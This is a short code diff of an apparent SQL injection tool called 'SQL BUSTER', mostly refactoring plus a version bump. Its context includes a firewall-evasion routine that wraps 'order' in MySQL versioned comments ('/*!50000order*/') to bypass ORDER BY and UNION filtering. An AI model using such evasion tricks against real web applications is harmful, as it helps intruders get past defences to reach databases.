@@ -169,11 +169,6 @@ def union(str):
             count2+=1
             print("[!] Bypassing union waf")
             bypass2(str)
-        else:
-            pass
-    else:
-        pass
-
     for aas in dict.keys():
         if aas in a:
             str=str.replace(aas,"Pwned by Sarthak")
@@ -186,8 +181,8 @@ def union(str):
                 totals=totals.replace(aas,"Pwned by Sarthak")
                 ss.append(dict[aas])
 
-    else:
-        print str
+
+    print str
 
 def bypass(temp): #bypass orderby
     temp=temp.replace("order","/*!50000order*/")
@@ -203,7 +198,7 @@ def bypass2(temp): #bypass orderby
 
 def test():
     print "#################################"
-    print "\n           SQL BUSTER v1.0"
+    print "\n           SQL BUSTER v1.2"
     print "\n               Made by Sarthak"
     print "\n#################################"
 
